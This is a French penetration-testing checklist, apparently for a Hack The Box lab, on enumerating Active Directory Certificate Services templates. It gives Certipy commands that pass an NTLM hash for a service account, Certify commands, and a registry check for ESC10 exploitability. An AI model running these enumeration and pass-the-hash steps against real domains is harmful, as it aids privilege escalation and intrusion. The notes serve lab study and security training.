
- [ ] [[#1. Identifier tous les templates de certificats]]
- [ ] [[#2. Identifier les templates de certificat vulnérables]]
- [ ] [[#3. ESC10]]

# 1. Identifier tous les templates de certificats

### *Certipy-ad*

```bash
certipy-ad find -u ca_svc@sequel.htb -no-pass -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51
```

### *Certify

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe

```
.\Certify.exe find
```

---

# 2. Identifier les templates de certificat vulnérables

> [!WARNING]
> Ne prend pas en compte ESC10

### *Certipy-ad*

```bash
certipy-ad find -vulnerable -u ca_svc@sequel.htb -no-pass -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -old-bloodhound
```

### *Certify

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe

```
.\Certify.exe find /vulnerable
```


----
# 3. ESC10

> [!TIP]
> Besoin d'un accès direct sur le serveur à impersonner afin de vérifier la valeur de la clé de registre CertificateMappingMethods dans HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\.
> Si configuré pour autoriser l'UPN based mapping (0x4) alors exploitable avec un template de certificat enrollable par un user dont on peut modifier l'UPN !

```POWERSHELL
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\
```
